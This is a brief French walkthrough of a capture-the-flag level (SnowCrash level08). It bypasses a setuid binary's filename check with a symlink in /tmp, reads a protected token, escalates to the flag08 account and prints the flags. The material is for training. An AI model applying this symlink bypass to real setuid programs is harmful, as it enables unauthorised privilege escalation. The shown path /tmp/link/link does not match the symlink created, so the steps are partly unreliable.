```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
Ici on a 2 fichiers, le token nous interesse mais il n'est pas lisible avec nos droits.
```
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```
On va essayer de contourner les permissions du fichier avec un lien symbolique.
```
level08@SnowCrash:~$ ln -s `pwd`/token /tmp/link  
level08@SnowCrash:~$ ./level08 /tmp/link/link
quif5eloekouj29ke0vouxean
```
On se sert du token pour acceder a flag08.
```
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
On a le flag, `25749xKZ8L7DkSCwJkT9dyv6f` :tada:
